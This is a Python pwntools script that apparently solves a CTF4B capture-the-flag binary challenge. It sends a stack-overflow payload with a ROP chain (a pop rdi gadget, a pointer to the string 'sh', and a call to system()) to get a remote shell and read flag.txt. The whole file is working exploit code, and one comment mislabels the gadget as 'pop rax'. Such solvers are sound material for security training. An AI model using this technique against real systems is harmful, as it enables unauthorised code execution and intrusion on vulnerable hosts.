#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '9001'))

context.log_level = 'critical'
binfile = './chall'
e = ELF(binfile)
context.binary = binfile

io = remote(HOST, PORT)

pad = b'a' * 0x18

rop = ROP(e)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])) # pop rax; ret
rop.raw(pack(next(e.search(b'sh\0'))))
rop.raw(pack(e.sym['help']+0xf)) # system()

payload = pad + rop.chain()

assert(len(payload) <= 0x30)

io.sendlineafter(b'?', payload)

io.sendline(b'echo exploited')
io.sendlineafter(b'exploited\n', b'cat flag.txt')

print(io.readline().decode('utf-8', 'ignore'), end='')
